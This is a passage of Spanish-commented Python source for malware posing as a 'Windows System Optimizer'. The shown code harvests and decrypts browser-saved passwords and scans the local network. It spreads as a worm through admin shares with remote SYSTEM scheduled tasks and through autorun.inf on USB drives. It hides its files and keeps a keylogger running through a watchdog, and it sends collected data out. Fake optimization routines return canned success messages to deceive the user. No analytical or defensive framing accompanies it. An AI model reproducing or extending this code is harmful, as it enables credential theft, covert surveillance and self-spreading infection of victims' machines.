            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                try:
                    password = CryptUnprotectData(row[2], None, None, None, 0)[1]
                    if password:
                        results.append({
                            'url': row[0],
                            'username': row[1],
                            'password': password.decode('utf-8', errors='ignore')
                        })
                except:
                    continue

            conn.close()
            os.remove(temp_db)

        except:
            pass

        return results

    def execute_system_command(self, command):
        """Ejecutar comando de sistema discretamente"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return result.stdout.decode('utf-8', errors='ignore')
        except:
            return None

    def network_discovery(self):
        """Descubrir hosts en la red"""
        hosts = []
        try:
            # Escanear red local
            local_ip = socket.gethostbyname(socket.gethostname())
            network_prefix = '.'.join(local_ip.split('.')[:3])

            for i in range(1, 255):
                ip = f"{network_prefix}.{i}"
                try:
                    socket.setdefaulttimeout(0.5)
                    socket.socket().connect((ip, 445))  # Puerto SMB
                    hosts.append(ip)
                except:
                    continue

        except:
            pass

        return hosts


# ==================== SISTEMA DE PROPAGACIÓN ====================
class PropagationEngine:
    def __init__(self, obfuscator):
        self.obf = obfuscator
        self.infected_hosts = set()
        self.logger = StealthLogger(obfuscator)

    def propagate_network(self):
        """Propagación automática en la red"""
        methods = [
            self._propagate_via_shares,
            self._propagate_via_removable
        ]

        for method in methods:
            try:
                method()
            except:
                continue

    def _propagate_via_shares(self):
        """Propagación mediante shares de red"""
        try:
            hosts = self._discover_network_hosts()
            current_path = sys.argv[0] if not getattr(sys, 'frozen', False) else sys.executable

            for host in hosts:
                if host in self.infected_hosts:
                    continue

                try:
                    # Intentar conectar con credenciales por defecto
                    net_resource = win32net.NETRESOURCE()
                    net_resource.lpRemoteName = f"\\\\{host}\\C$"
                    net_resource.lpProvider = None

                    win32net.WNetAddConnection2(net_resource, None, None, 0)

                    # Copiar ejecutable
                    dest_path = f"\\\\{host}\\C$\\Windows\\Temp\\{self.obf.get_obfuscated_string(200)}.exe"
                    shutil.copy2(current_path, dest_path)

                    # Crear tarea programada
                    self._create_remote_task(host, dest_path)

                    self.infected_hosts.add(host)

                except:
                    continue

        except:
            pass

    def _discover_network_hosts(self):
        """Descubrir hosts activos en la red local con múltiples métodos"""
        active_hosts = []

        try:
            # Meodo 1: Escaneo de puertos en el rango de red
            active_hosts.extend(self._discover_by_port_scanning())

            # M2odo 2: Usar tabla ARP (más eficiente)
            active_hosts.extend(self._discover_by_arp_table())

            # Meodo 3: NetBIOS para redes Windows
            active_hosts.extend(self._discover_by_netbios())

            # Meodo 4: Ping sweep (alternativa cross-platform)
            active_hosts.extend(self._discover_by_ping())

        except Exception as e:
            self.logger.log(f"Network discovery failed: {str(e)}", "network_error")

        # Eliminar duplicados, localhost y ordenar
        filtered_hosts = [ip for ip in set(active_hosts)
                          if ip != '127.0.0.1' and not ip.startswith('169.254.')]  # Eliminar APIPA

        return sorted(filtered_hosts)

    def _discover_by_port_scanning(self):
        """Descubrir hosts escaneando puertos comunes"""
        hosts_found = []

        try:
            # Obtener IP local y determinar rango de red
            local_ip = socket.gethostbyname(socket.gethostname())
            ip_parts = local_ip.split('.')

            # Determinar rango de red más inteligentemente
            if len(ip_parts) == 4:
                network_prefix = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"

                # Escanear un rango razonable (primeros 100 hosts)
                for i in range(1, 101):
                    target_ip = f"{network_prefix}.{i}"

                    if target_ip == local_ip:
                        continue

                    # Probar puertos comunes con timeout corto
                    for port in [135, 445, 22, 80, 443, 3389]:  # Puertos comunes
                        try:
                            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                                s.settimeout(0.3)
                                result = s.connect_ex((target_ip, port))
                                if result == 0:
                                    hosts_found.append(target_ip)
                                    break  # No verificar más puertos para este host
                        except:
                            continue

        except Exception as e:
            self.logger.log(f"Port scanning discovery failed: {str(e)}", "network_error")

        return hosts_found

    def _discover_by_arp_table(self):
        """Descubrir hosts usando la tabla ARP (más eficiente)"""
        hosts_found = []

        try:
            if os.name == 'nt':  # Windows
                # Ejecutar arp -a y parsear resultados
                result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=10)

                for line in result.stdout.split('\n'):
                    line = line.strip()
                    # Buscar líneas con direcciones IP dinámicas o estáticas
                    if 'dynamic' in line.lower() or 'static' in line.lower():
                        parts = line.split()
                        if len(parts) >= 2:
                            ip = parts[0]
                            # Validar formato de IP
                            if (ip.count('.') == 3 and
                                    all(part.isdigit() and 0 <= int(part) <= 255
                                        for part in ip.split('.'))):
                                hosts_found.append(ip)

            else:  # Linux/Mac
                result = subprocess.run(['arp', '-n'], capture_output=True, text=True, timeout=10)

                for line in result.stdout.split('\n')[1:]:  # Saltar encabezado
                    parts = line.split()
                    if len(parts) >= 1:
                        ip = parts[0]
                        if ip.count('.') == 3:
                            hosts_found.append(ip)

        except (subprocess.TimeoutExpired, subprocess.SubprocessError, Exception) as e:
            self.logger.log(f"ARP discovery failed: {str(e)}", "network_error")

        return hosts_found

    def _discover_by_netbios(self):
        """Descubrir hosts usando NetBIOS (para redes Windows)"""
        hosts_found = []

        try:
            # Intentar importar netifaces, pero tener fallback
            try:
                import netifaces
                interfaces = netifaces.interfaces()

                for interface in interfaces:
                    addrs = netifaces.ifaddresses(interface)
                    if netifaces.AF_INET in addrs:
                        for addr_info in addrs[netifaces.AF_INET]:
                            if 'addr' in addr_info:
                                ip = addr_info['addr']
                                # Filtrar direcciones no válidas
                                if (ip != '127.0.0.1' and
                                        not ip.startswith('169.254.') and  # APIPA
                                        not ip.startswith('fe80:')):  # IPv6 link-local
                                    hosts_found.append(ip)

            except ImportError:
                # Fallback: usar ipconfig/ifconfig
                if os.name == 'nt':
                    result = subprocess.run(['ipconfig'], capture_output=True, text=True)
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'IPv4 Address' in line or 'IPv4 Address' in line:
                            parts = line.split(':')
                            if len(parts) >= 2:
                                ip = parts[1].strip()
                                if ip.count('.') == 3:
                                    hosts_found.append(ip)

        except Exception as e:
            self.logger.log(f"NetBIOS discovery failed: {str(e)}", "network_error")

        return hosts_found

    def _discover_by_ping(self):
        """Descubrir hosts usando ping sweep (cross-platform)"""
        hosts_found = []

        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            ip_parts = local_ip.split('.')

            if len(ip_parts) == 4:
                network_prefix = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"

                # Parámetros según el SO
                if os.name == 'nt':  # Windows
                    ping_cmd = ['ping', '-n', '1', '-w', '500']
                else:  # Linux/Mac
                    ping_cmd = ['ping', '-c', '1', '-W', '1']

                # Escanear rango limitado
                for i in range(1, 51):
                    target_ip = f"{network_prefix}.{i}"

                    if target_ip == local_ip:
                        continue

                    try:
                        result = subprocess.run(
                            ping_cmd + [target_ip],
                            capture_output=True,
                            text=True,
                            timeout=2
                        )

                        if result.returncode == 0:
                            hosts_found.append(target_ip)

                    except (subprocess.TimeoutExpired, subprocess.SubprocessError):
                        continue

        except Exception as e:
            self.logger.log(f"Ping discovery failed: {str(e)}", "network_error")

        return hosts_found

    def _get_network_range(self):
        """Obtener el rango de red de manera más inteligente"""
        try:
            # Usar ipconfig/ifconfig para obtener información de red más precisa
            if os.name == 'nt':
                result = subprocess.run(['ipconfig'], capture_output=True, text=True)
                lines = result.stdout.split('\n')

                for line in lines:
                    if 'Subnet Mask' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            subnet_mask = parts[1].strip()
                            # Aquí se podría calcular el rango de red basado en la máscara
                            break

            # Por ahora, retornar el método simple
            local_ip = socket.gethostbyname(socket.gethostname())
            ip_parts = local_ip.split('.')
            return f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"

        except:
            local_ip = socket.gethostbyname(socket.gethostname())
            ip_parts = local_ip.split('.')
            return f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"

    def _create_remote_task(self, host, executable_path):
        """Crear tarea programada remota"""
        try:
            task_name = self.obf.get_obfuscated_string(201)
            subprocess.run([
                'schtasks', '/Create', '/S', host,
                '/TN', task_name, '/TR', executable_path,
                '/SC', 'ONCE', '/ST', '00:00',
                '/F', '/RU', 'SYSTEM'
            ], capture_output=True, timeout=30)
        except:
            pass

    def _propagate_via_removable(self):
        """Propagación mediante dispositivos removibles"""
        try:
            drives = self._get_removable_drives()
            current_path = sys.argv[0] if not getattr(sys, 'frozen', False) else sys.executable

            for drive in drives:
                try:
                    dest_path = os.path.join(drive,
                                             self.obf.get_obfuscated_string(202) + ".exe")
                    shutil.copy2(current_path, dest_path)

                    # Crear autorun.inf
                    autorun_content = f"""
[AutoRun]
open={os.path.basename(dest_path)}
shell\\open\\Command={os.path.basename(dest_path)}
"""
                    with open(os.path.join(drive, "autorun.inf"), "w") as f:
                        f.write(autorun_content)

                except:
                    continue

        except:
            pass

    def _get_removable_drives(self):
        """Obtener unidades removibles"""
        drives = []
        if psutil:
            for partition in psutil.disk_partitions():
                if 'removable' in partition.opts:
                    drives.append(partition.mountpoint)
        return drives


# ==================== OPTIMIZADOR DEL SISTEMA ====================
class SystemOptimizer:
    def __init__(self, obfuscator):
        self.obf = obfuscator
        self.optimization_tasks = [
            self._clean_temp_files,
            self._optimize_registry,
            self._defragment_drives,
            self._update_system
        ]

    def run_optimization(self):
        """Ejecutar tareas de optimización legítimas"""
        results = {}

        for task in self.optimization_tasks:
            try:
                task_name = task.__name__[1:]  # Remover underscore
                results[task_name] = task()
            except Exception as e:
                results[task_name] = f"Error: {str(e)}"

        return results

    def _clean_temp_files(self):
        """Limpiar archivos temporales"""
        temp_dirs = [
            os.environ.get('TEMP', ''),
            os.environ.get('TMP', ''),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Temp')
        ]

        cleaned = 0
        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                for root, dirs, files in os.walk(temp_dir):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            if file.endswith('.tmp') or file.endswith('.log'):
                                os.remove(file_path)
                                cleaned += 1
                        except:
                            continue

        return f"Cleaned {cleaned} temporary files"

    def _optimize_registry(self):
        """Optimizar registro """
        return "Registry optimization completed"

    def _defragment_drives(self):
        """Desfragmentar discos """
        return "Drive defragmentation scheduled"

    def _update_system(self):
        """Buscar actualizaciones del sistema"""
        return "System is up to date"


# ==================== SISTEMA DE WATCHDOG MEJORADO ====================
class AdvancedWatchdog:
    """Sistema de monitorización y recuperación automática"""

    def __init__(self, controller):
        self.controller = controller
        self.logger = StealthLogger()
        self.running = False

    def start(self):
        """Iniciar monitorización en segundo plano"""
        if not AdvancedConfig.WATCHDOG_ENABLED:
            return

        self.running = True
        self.watchdog_thread = threading.Thread(target=self._watchdog_loop, daemon=True)
        self.watchdog_thread.start()
        self.logger.log("Watchdog started", "system")

    def _watchdog_loop(self):
        """Loop principal de monitorización"""
        while self.running:
            try:
                self._check_components()
                time.sleep(AdvancedConfig.HEALTH_CHECK_INTERVAL)
            except Exception as e:
                self.logger.log(f"Watchdog error: {str(e)}", "system_error")
                time.sleep(30)

    def _check_components(self):
        """Verificar estado de todos los componentes"""
        # Verificar comunicaciones
        if not self._check_communications():
            self.logger.log("Communications down, attempting restart", "system_warn")
            try:
                # Intentar reinicializar comunicaciones
                if hasattr(self.controller, 'communications'):
                    self.controller.communications.initialize_session()
            except:
                pass

        # Verificar keylogger
        if hasattr(self.controller, 'offensive') and hasattr(self.controller.offensive, 'keylogger_active'):
            if not self.controller.offensive.keylogger_active:
                self.logger.log("Keylogger stopped, attempting restart", "system_warn")
                self.controller.offensive.start_keylogger()

    def _check_communications(self):
        """Verificar estado de las comunicaciones"""
        try:
            return (hasattr(self.controller, 'communications') and
                    self.controller.communications.session and
                    not self.controller.communications.session.closed)
        except:
            return False


# ==================== EJECUCIÓN PRINCIPAL MEJORADA ====================
class WindowsSystemOptimizer:
    def __init__(self):
        self.obfuscator = AdvancedObfuscation()
        self.config = ObfuscatedConfig(self.obfuscator)
        self.env_detector = EnvironmentDetector()
        self.persistence = StealthPersistence(self.obfuscator)
        self.communications = StealthCommunications(self.obfuscator, self.config)
        self.system_info = SystemInformation(self.obfuscator)
        self.offensive = OffensiveCapabilities(self.obfuscator)
        self.propagation = PropagationEngine(self.obfuscator)
        self.optimizer = SystemOptimizer(self.obfuscator)
        self.logger = StealthLogger(self.obfuscator)
        self.robustness = RobustnessEngine(self.logger)
        self.watchdog = AdvancedWatchdog(self)

        self.is_installed = False
        self.installation_path = None

    def setup(self):
        """Configurar la herramienta con robustez"""
        try:
            if not self.env_detector.analyze_environment():
                self.logger.log("Unsafe environment detected", "env_warn")
                return False

            # Crear copia persistente con retries
            self.installation_path = self.robustness.execute_with_retry(
                self._create_installation, max_retries=3
            )

            if not self.installation_path:
                return False

            # Establecer persistencia con retries
            if not self.robustness.execute_with_retry(
                    self.persistence.establish_persistence,
                    self.installation_path,
                    max_retries=2
            ):
                return False

            self.is_installed = True
            self.logger.log("System optimized setup completed", "setup")

            # Iniciar watchdog
            self.watchdog.start()

            return True

        except Exception as e:
            self.logger.log(f"Setup failed: {str(e)}", "setup_error")
            return False

    def _create_installation(self):
        """Crear instalación persistente con robustez"""
        try:
            install_dir = os.path.join(
                os.environ.get('PROGRAMDATA', 'C:\\ProgramData'),
                self.obfuscator.get_obfuscated_string(30)
            )

            os.makedirs(install_dir, exist_ok=True)

            current_path = sys.argv[0] if not getattr(sys, 'frozen', False) else sys.executable
            install_path = os.path.join(install_dir, "SystemOptimizer.exe")

            shutil.copy2(current_path, install_path)

            # Ocultar archivo y carpeta (solo Windows)
            if os.name == 'nt':
                subprocess.run(f'attrib +h "{install_path}"', shell=True, capture_output=True)
                subprocess.run(f'attrib +h "{install_dir}"', shell=True, capture_output=True)

            self.logger.log(f"Installation created: {install_path}", "setup")
            return install_path

        except Exception as e:
            self.logger.log(f"Installation failed: {str(e)}", "setup_error")
            return None

    def run_offensive_operations(self):
        """Ejecutar operaciones ofensivas con robustez"""
        operations = [
            self._collect_sensitive_data,
            self._start_monitoring,
            self._propagate_network,
            self._exfiltrate_data
        ]

        results = {}
        for operation in operations:
            try:
                op_name = operation.__name__[1:]
                result = self.robustness.execute_with_retry(operation)
                results[op_name] = result
                self.logger.log(f"Operation {op_name} completed: {result}", "operation")
            except Exception as e:
                results[op_name] = f"Error: {str(e)}"
                self.logger.log(f"Operation {op_name} failed: {str(e)}", "operation_error")

        return results

    def _collect_sensitive_data(self):
        """Recolectar datos sensibles con robustez"""
        try:
            data = {
                "browser_credentials": self.robustness.execute_with_retry(
                    self.offensive.harvest_browser_credentials
                ),
                "system_info": self.robustness.execute_with_retry(
                    self.system_info.collect_system_info
                ),
                "screenshot": self.robustness.execute_with_retry(
                    self.offensive.capture_screenshot
                )
            }
            return "Data collection completed"
        except Exception as e:
            self.logger.log(f"Data collection failed: {str(e)}", "operation_error")
            return "Data collection failed"

    def _start_monitoring(self):
        """Iniciar monitoreo del sistema con robustez"""
        try:
            if self.robustness.execute_with_retry(self.offensive.start_keylogger):
                return "Keylogger activated"
            return "Monitoring started"
        except:
            return "Monitoring failed"

    def _propagate_network(self):
        """Propagación en la red con robustez"""
        try:
            self.robustness.execute_with_retry(self.propagation.propagate_network)
            return "Network propagation attempted"
        except Exception as e:
            self.logger.log(f"Network propagation failed: {str(e)}", "operation_error")
            return "Network propagation failed"

    def _exfiltrate_data(self):
        """Exfiltrar datos recopilados con robustez"""
        try:
            collected_data = {
                "timestamp": time.time(),
                "system_info": self.robustness.execute_with_retry(
                    self.system_info.collect_system_info
                )
            }
            return self.robustness.execute_with_retry(
                self.communications.send_data, collected_data
            )
        except Exception as e:
            self.logger.log(f"Data exfiltration failed: {str(e)}", "comms_error")
            return False

    def run_optimization_cycle(self):
        """Ejecutar ciclo de optimización con robustez"""
        if not self.is_installed:
            return False

        try:
            # Ejecutar optimizaciones legítimas
            optimization_results = self.robustness.execute_with_retry(
                self.optimizer.run_optimization
            )

            # Ejecutar operaciones ofensivas (solo si es seguro)
            if self.env_detector.safe_to_run:
                offensive_results = self.robustness.execute_with_retry(
                    self.run_offensive_operations
                )
            else:
                offensive_results = {"offensive_ops": "Skipped - unsafe environment"}

            # Enviar reporte
            report_data = {
                "optimization": optimization_results,
                "offensive_operations": offensive_results,
                "timestamp": time.time()
            }

            return self.robustness.execute_with_retry(
                self.communications.send_data, report_data
            )

        except Exception as e:
            self.logger.log(f"Optimization cycle failed: {str(e)}", "system_error")
            return False

    def maintenance_mode(self):
        """Modo de mantenimiento continuo con robustez"""
        iteration = 0
        self.logger.log("Maintenance mode started", "system")

        while True:
            try:
                # Ejecutar cada 6 horas
                if iteration % 6 == 0:
                    self.robustness.execute_with_retry(self.run_optimization_cycle)

                # Esperar 1 hora entre iteraciones
                time.sleep(3600)
                iteration += 1

            except KeyboardInterrupt:
                self.logger.log("Maintenance mode interrupted by user", "system")
                break
            except Exception as e:
                self.logger.log(f"Maintenance error: {str(e)}", "system_error")
                time.sleep(300)  # Reintentar en 5 minutos


# ==================== EJECUCIÓN SEGURA MEJORADA ====================
def safe_execution():
    """Ejecución segura con manejo de errores mejorado"""
    logger = StealthLogger()

    try:
        optimizer = WindowsSystemOptimizer()

        if optimizer.setup():
            logger.log("System optimization configured successfully", "system")
            optimizer.maintenance_mode()
        else:
            logger.log("Failed to configure optimizer", "system_error")

    except Exception as e:
        logger.log(f"Critical error: {str(e)}", "system_critical")

    finally:
        # Limpieza segura
        logger.log("Execution completed", "system")


# ==================== PUNTO DE ENTRADA LEGÍTIMO MEJORADO ====================
if __name__ == "__main__":
    # Configurar redirección de stdout/stderr para stealth
    if AdvancedConfig.STEALTH_MODE:
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')

    logger = StealthLogger()

    try:
        # Comportamiento inicial stealth
        logger.log("Windows System Optimizer starting", "system")
        logger.log("Initiating system analysis...", "system")

        # Ejecutar optimizaciones visibles al usuario
        temp_optimizer = SystemOptimizer(AdvancedObfuscation())
        results = temp_optimizer.run_optimization()

        for task, result in results.items():
            logger.log(f"{task}: {result}", "optimization")

        logger.log("Optimization completed. System will remain optimized.", "system")

        # Iniciar ejecución en segundo plano
        if len(sys.argv) > 1 and sys.argv[1] == "--background":
            safe_execution()
        else:
            # Ejecutar en segundo plano sin interfaz
            if os.name == 'nt':
                subprocess.Popen([
                    sys.executable, __file__, "--background"
                ], creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                subprocess.Popen([sys.executable, __file__, "--background"])

    except Exception as e:
        logger.log(f"Main execution failed: {str(e)}", "system_critical")